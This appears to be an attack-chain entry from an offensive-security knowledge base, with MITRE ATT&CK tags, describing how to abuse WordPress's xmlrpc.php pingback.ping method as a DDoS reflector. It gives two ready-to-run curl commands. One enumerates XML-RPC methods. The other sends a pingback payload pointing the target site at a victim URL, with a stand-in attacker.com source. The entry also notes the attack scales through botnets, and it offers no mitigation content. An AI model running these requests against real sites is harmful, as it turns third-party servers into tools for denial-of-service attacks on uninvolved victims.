---
tags:
  - wordpress
  - xmlrpc
  - ddos
  - pingback
  - resource-consumption
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Verify-xmlrpc-php-Endpoint]]'
  - '[[procedures/Exploit-xmlrpc-php-for-DDoS-via-Pingback]]'
step_count: 2
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:37.336Z'
description: >-
  Exploits the enabled xmlrpc.php endpoint in WordPress to perform
  application-level DDoS attacks via pingback.ping, forcing the server to fetch
  victim URLs and consume resources.
skill_level: intermediate
impact_level: high
id: 36e7bda6-9e40-4063-aeea-1f9ac71c2f6c
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# WordPress xmlrpc.php Pingback DDoS Attack

Multi-stage attack chain demonstrating exploitation of the xmlrpc.php endpoint in WordPress for DDoS via pingback functionality, allowing attackers to turn the site into a botnet reflector for resource exhaustion on victims.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Verify Endpoint] --> B[Exploit Pingback for DDoS]
    B --> C[Resource Exhaustion on Victim]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- WordPress installation with xmlrpc.php enabled
- PHP-based web server
- No restrictions on pingback/trackback features

### Initial Access Requirements

- Network access to the target WordPress site
- No credentials needed (public-facing endpoint)

## Detailed Attack Procedures

### Step 1: Verify xmlrpc.php Endpoint
procedure: [[procedures/Verify-xmlrpc-php-Endpoint]]

**Objective**: Confirm the xmlrpc.php endpoint is enabled and responsive by listing available XML-RPC methods.

**Instructions**: Use Burp Suite's Repeater or equivalent to send a POST request. Alternatively, execute [[commands/xmlrpc-system-listmethods]] via curl:

```bash
curl -X POST http://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
```

This sends an XML payload to invoke system.listMethods.

**Expected Output**: XML response listing methods like pingback.ping, confirming the endpoint is active.

**Success Indicators**:
- HTTP 200 response with XML containing method list
- pingback.ping method present in output

### Step 2: Exploit xmlrpc.php for DDoS via Pingback
procedure: [[procedures/Exploit-xmlrpc-php-for-DDoS-via-Pingback]]

**Objective**: Abuse the pingback.ping method to force the server to fetch a victim URL, enabling DDoS amplification when scaled in a botnet.

**Instructions**: Send a POST request with pingback.ping payload. Use [[commands/xmlrpc-pingback-ping]] via curl, replacing source and target URLs:

```bash
curl -X POST http://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/source/</string></value></param><param><value><string>https://victim.com/target/</string></value></param></params></methodCall>'
```

The server will fetch the victim URL to verify the pingback, logging the request and consuming resources.

**Expected Output**: XML fault or success response; check victim server logs for inbound requests from the target.

**Success Indicators**:
- Victim server receives fetch request from target
- Scalable to multiple requests for DDoS effect

## Attack Chain Summary

### Key Achievements

1. Confirmed xmlrpc.php exposure in WordPress
2. Demonstrated pingback abuse for outbound requests
3. Enabled potential botnet integration for DDoS

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Network Denial of Service]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Impact]]

---
*Last updated: 2023-10-01T00:00:00Z*
